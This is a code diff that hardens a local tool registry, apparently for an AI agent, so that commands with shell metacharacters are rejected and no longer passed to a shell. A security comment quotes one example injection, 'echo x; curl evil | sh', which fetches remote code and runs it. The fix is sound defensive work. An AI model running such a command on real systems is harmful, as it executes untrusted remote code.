@@ -2145,25 +2145,28 @@ class LocalToolRegistry:
                         )
 
                 # Check if command uses shell pipelines or metacharacters (| && ; > <)
+                # SECURITY: These are REJECTED, not passed to a shell. The old code
+                # fell through to create_subprocess_shell(raw_command) which bypassed
+                # the safe-binary check entirely — e.g. "echo x; curl evil | sh"
+                # passed because only "echo" was checked. Now we hard-reject.
                 has_pipe = any(op in command for op in ("|", "&&", ";", ">", "<"))
 
                 if has_pipe:
-                    proc = await asyncio.create_subprocess_shell(
-                        command,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                        cwd=cwd,
-                        env=child_env,
+                    return (
+                        "Error: Shell metacharacters (|, &&, ;, >, <) are blocked "
+                        "for security — they bypass the safe-binary allowlist. "
+                        "Use python_exec for multi-step operations, or chain "
+                        "native tools (file_read, file_write, git_*) individually."
                     )
-                else:
-                    proc = await asyncio.create_subprocess_exec(
-                        args[0],
-                        *args[1:],
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                        cwd=cwd,
-                        env=child_env,
-                    )
+
+                proc = await asyncio.create_subprocess_exec(
+                    args[0],
+                    *args[1:],
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    cwd=cwd,
+                    env=child_env,
+                )
                 
                 # Bounded stream reader to cap memory allocations for large outputs
                 async def _read_stream_capped(stream: asyncio.StreamReader | None, limit: int) -> bytes:
